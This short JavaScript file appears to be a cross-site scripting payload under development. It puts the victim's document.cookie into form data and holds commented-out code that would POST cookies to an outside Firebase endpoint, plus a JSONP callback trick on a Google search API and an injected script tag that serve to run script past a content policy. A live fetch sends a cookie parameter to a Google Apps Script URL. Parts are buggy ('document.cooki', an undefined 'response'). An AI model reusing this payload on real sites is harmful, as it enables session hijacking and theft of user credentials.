var formData = new FormData();
formData.append('title', 'test');
formData.append('content', document.cookie);
formData.append('submit', 'save');

//function takeData(data) {
//    alert(1);
//    fetch("https://test-43d17.firebaseio.com/cookie.json", {
//        method: "POST",
//        body: JSON.stringify({cookies: document.cooki})
//    }).then(res =>{});
//}

//fetch("https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=takeData")
//.then(res=>{
//
//});
fetch("https://script.google.com/macros/s/AKfycbw810ejtzxD6RkRRiwH1UUp3QCZ-t71T6Gw0uPm4lD8JepQH1A/exec?action=get&cookie=Iamworking", {
    method: "GET",
    credentials: "same-origin"
}).then(res => {
    alert(response.json);
});

//<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=fetch('https://test-43d17.firebaseio.com/cookie.json', {method:'POST',body:JSON.stringify('test')})"></script>
